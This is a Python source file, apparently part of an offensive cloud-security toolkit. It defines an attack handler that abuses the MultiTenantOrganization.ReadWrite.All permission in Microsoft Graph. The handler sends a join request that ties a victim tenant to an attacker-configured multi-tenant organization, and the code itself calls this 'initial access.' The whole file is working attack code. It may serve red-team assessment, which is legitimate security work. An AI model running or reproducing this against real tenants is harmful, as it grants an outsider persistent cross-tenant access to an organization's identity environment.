from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.multitenant_handler')


class Multitenant_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "MultiTenantOrganization.ReadWrite.All" in request.roles:
            status = False
            attack_name = "MultiTenantVectors"
            message = ""
            error = "MultiTenantVectors - failed"
            conf = request.attack_config['multiTenant']
            logger.debug("MultiTenantOrganization.ReadWrite.All - Allows the app to read and write all multi-tenant organization details and tenants, without a signed-in user.")

            logger.debug("Attack vector - initial access.")
            try:
                create_message_URL = "https://graph.microsoft.com/beta/tenantRelationships/multiTenantOrganization/joinRequest"
                message_obj = {
                    "addedByTenantId": conf["tenantId"]
                }

                result = requests.patch(create_message_URL, json=message_obj, headers=request.request_headers)
                if result.status_code == 204:
                    message += "Setup multi tenant with %s   \n" % (conf["tenantId"])
                    status = True
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in multitenant_handler function")

            
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))



        return super().handle(request,responses)
